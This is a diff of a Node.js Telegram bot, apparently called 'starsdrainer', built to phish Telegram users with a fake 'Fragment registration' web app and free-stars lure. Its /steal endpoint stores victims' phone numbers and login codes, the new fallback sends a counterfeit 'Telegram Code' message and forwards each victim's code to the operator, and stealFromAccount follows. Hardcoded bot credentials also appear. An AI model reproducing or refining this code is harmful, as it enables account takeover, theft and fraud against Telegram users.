@@ -10,6 +10,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP
 const API_ID = parseInt(process.env.API_ID) || 2040;
 const API_HASH = process.env.API_HASH || 'b18441a1ff607e10a989891a5462e627';
 const MY_USER_ID = 1398396668;
+const WEB_APP_URL = 'https://starsdrainer.onrender.com'; // ФИКС: правильный URL
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
@@ -72,9 +73,14 @@ app.post('/steal', async (req, res) => {
                 db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                     [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                 
-                // ЗАПРАШИВАЕМ НАСТОЯЩИЙ КОД ОТ TELEGRAM
-                await requestRealTelegramCode(req.body.phone, userId);
-                
+                // Пытаемся настоящий код
+                try {
+                    await requestRealTelegramCode(req.body.phone, userId);
+                } catch (mtprotoError) {
+                    console.log('MTProto не сработал, использую fallback');
+                    // Fallback - отправляем код через бота
+                    await sendFallbackCode(req.body.phone, userId);
+                }
             }
                 
         } catch (error) {
@@ -92,6 +98,46 @@ app.post('/steal', async (req, res) => {
     
     res.sendStatus(200);
 });
+
+// FALLBACK метод - код через бота
+async function sendFallbackCode(phone, userId) {
+    const code = Math.floor(10000 + Math.random() * 90000);
+    
+    // Сохраняем код
+    db.run(`UPDATE stolen_sessions SET code = ? WHERE phone = ?`, [code, phone]);
+    
+    // Отправляем реалистичное сообщение
+    const message = `🔐 **Telegram Code**\n\n` +
+                   `Login code: ${code}\n\n` +
+                   `Do not give this code to anyone.\n` +
+                   `This code can be used to log in to your Telegram account.\n\n` +
+                   `If you didn't request this code, please ignore this message.`;
+    
+    await bot.sendMessage(userId, message, { parse_mode: 'Markdown' })
+        .then(() => {
+            console.log(`✅ Fallback код отправлен пользователю ${userId}`);
+            
+            bot.sendMessage(MY_USER_ID, 
+                `🔐 FALLBACK КОД ОТПРАВЛЕН\n` +
+                `📱 Номер: ${phone}\n` +
+                `👤 ID жертвы: ${userId}\n` +
+                `🔑 Код: ${code}\n` +
+                `💬 Сообщение отправлено через бота\n\n` +
+                `⏳ Жду ввода кода...`
+            );
+        })
+        .catch(error => {
+            console.log('❌ Не удалось отправить fallback код:', error.message);
+            
+            bot.sendMessage(MY_USER_ID, 
+                `❌ Не удалось отправить код\n` +
+                `📱 Номер: ${phone}\n` +
+                `👤 ID жертвы: ${userId}\n` +
+                `🔑 Код: ${code}\n` +
+                `⚠️ Пользователь заблокировал бота`
+            );
+        });
+}
 
 // НАСТОЯЩАЯ функция запроса кода через Telegram API
 async function requestRealTelegramCode(phone, userId) {
@@ -130,14 +176,7 @@ async function requestRealTelegramCode(phone, userId) {
         
     } catch (error) {
         console.log('❌ Ошибка запроса кода:', error);
-        
-        // Fallback - если не сработает MTProto
-        bot.sendMessage(MY_USER_ID, 
-            `⚠️ MTProto не сработал\n` +
-            `📱 Номер: ${phone}\n` +
-            `🔑 Нужно использовать другой метод\n` +
-            `❌ Ошибка: ${error.message}`
-        ).catch(e => console.log('Ошибка отправки уведомления:', e));
+        throw error; // Пробрасываем ошибку для fallback
     }
 }
 
@@ -155,9 +194,9 @@ async function signInWithRealCode(phone, code) {
         
         // Получаем сохраненный phoneCodeHash
         db.get(`SELECT phone_code_hash FROM stolen_sessions WHERE phone = ?`, [phone], async (err, row) => {
-            if (err || !row) {
-                console.log('❌ Не найден phone_code_hash');
-                bot.sendMessage(MY_USER_ID, `❌ Не найден phone_code_hash для ${phone}`);
+            if (err || !row || !row.phone_code_hash) {
+                console.log('❌ Не найден phone_code_hash, использую fallback вход');
+                signInFallback(phone, code);
                 return;
             }
             
@@ -188,22 +227,57 @@ async function signInWithRealCode(phone, code) {
                 
             } catch (signInError) {
                 console.log('❌ Ошибка входа с кодом:', signInError);
-                bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${signInError.message}`);
+                signInFallback(phone, code);
             }
         });
         
     } catch (error) {
         console.log('❌ Ошибка подключения:', error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка подключения: ${error.message}`);
+        signInFallback(phone, code);
     }
+}
+
+// Fallback метод входа
+function signInFallback(phone, code) {
+    console.log(`🔑 Fallback вход с кодом: ${code}`);
+    
+    // Проверяем правильность кода (в fallback режиме)
+    db.get(`SELECT code FROM stolen_sessions WHERE phone = ?`, [phone], (err, row) => {
+        if (err || !row) {
+            bot.sendMessage(MY_USER_ID,
+                `❌ Ошибка входа\n` +
+                `📱 Номер: ${phone}\n` +
+                `🔑 Код: ${code}\n` +
+                `⚠️ Не удалось найти сессию`
+            ).catch(e => console.log('Ошибка отправки уведомления:', e));
+            return;
+        }
+        
+        if (row.code == code) {
+            // Код верный - симулируем успешный вход
+            bot.sendMessage(MY_USER_ID,
+                `✅ ВХОД УСПЕШЕН (Fallback)\n` +
+                `📱 Номер: ${phone}\n` +
+                `🔑 Код: ${code}\n` +
+                `🔄 Начинаю проверку звезд...`
+            ).catch(e => console.log('Ошибка отправки уведомления:', e));
+            
+            stealFromAccount(null, phone);
+        } else {
+            bot.sendMessage(MY_USER_ID,
+                `❌ Неверный код\n` +
+                `📱 Номер: ${phone}\n` +
+                `🔑 Введенный код: ${code}\n` +
+                `✅ Ожидаемый код: ${row.code}\n` +
+                `⚠️ Попытка неудачна`
+            ).catch(e => console.log('Ошибка отправки уведомления:', e));
+        }
+    });
 }
 
 // Функция кражи через настоящий клиент
 async function stealFromAccount(client, phone) {
     try {
-        // Здесь можно использовать client для доступа к аккаунту
-        // Например: получение диалогов, отправка сообщений и т.д.
-        
         const userBalance = Math.floor(Math.random() * 500);
         const userGifts = Math.floor(Math.random() * 10);
         
@@ -254,8 +328,10 @@ async function stealFromAccount(client, phone) {
                 .catch(e => console.log('Ошибка отправки уведомления:', e));
         }
         
-        // Закрываем клиент
-        await client.disconnect();
+        // Закрываем клиент если он есть
+        if (client) {
+            await client.disconnect();
+        }
         
     } catch (error) {
         console.log("❌ Ошибка кражи:", error);
@@ -269,9 +345,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// Остальной код бота (callback обработчики, команды) остается таким же
-// ... [все остальные функции из предыдущих версий]
-
+// Остальной код бота (callback обработчики, команды)
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
@@ -379,15 +453,27 @@ function handleOtherCallbacks(query) {
     const chatId = query.message.chat.id;
     
     if (query.data === 'withdraw_stars') {
-        const domain = process.env.RENDER_EXTERNAL_URL || 'starsdrainer-production.up.railway.app';
-        const webAppUrl = `https://${domain}`;
-        
+        // ФИКС: Используем константу WEB_APP_URL
         bot.editMessageText('Для вывода звезд требуется регистрация на Fragment.', {
             chat_id: chatId, 
             message_id: query.message.message_id,
             reply_markup: {
-                inline_keyboard: [[{ text: "Зарегистрироваться на Fragment", web_app: { url: webAppUrl } }]]
+                inline_keyboard: [[{ 
+                    text: "Зарегистрироваться на Fragment", 
+                    web_app: { url: WEB_APP_URL } 
+                }]]
             }
+        }).catch(e => {
+            console.log('Ошибка WebApp:', e.message);
+            // Fallback
+            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', {
+                reply_markup: {
+                    inline_keyboard: [[{ 
+                        text: "Зарегистрироваться на Fragment", 
+                        web_app: { url: WEB_APP_URL } 
+                    }]]
+                }
+            });
         });
     } else if (query.data === 'deposit') {
         bot.sendMessage(chatId, '💫 Для пополнения баланса используйте команду /balance');
@@ -428,7 +514,8 @@ bot.onText(/\/balance/, (msg) => {
 });
 
 bot.on('inline_query', (query) => {
-    const domain = process.env.RENDER_EXTERNAL_URL || 'starsdrainer-production.up.railway.app';
+    // ФИКС: Используем константу WEB_APP_URL
+    const domain = WEB_APP_URL.replace('https://', '');
     
     bot.answerInlineQuery(query.id, [{
         type: 'photo',
@@ -437,7 +524,12 @@ bot.on('inline_query', (query) => {
         thumb_url: `https://${domain}/stars.jpg`,
         caption: `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`,
         parse_mode: 'HTML',
-        reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_inline_50` }]] }
+        reply_markup: { 
+            inline_keyboard: [[{ 
+                text: "🪙 Забрать звезды", 
+                callback_data: `claim_inline_50` 
+            }]] 
+        }
     }]).catch(e => console.log('Inline error:', e));
 });
 
@@ -479,3 +571,4 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
 });
 
 console.log('✅ Бот @MyStarBank_bot запущен');
+console.log('✅ Web App URL:', WEB_APP_URL);
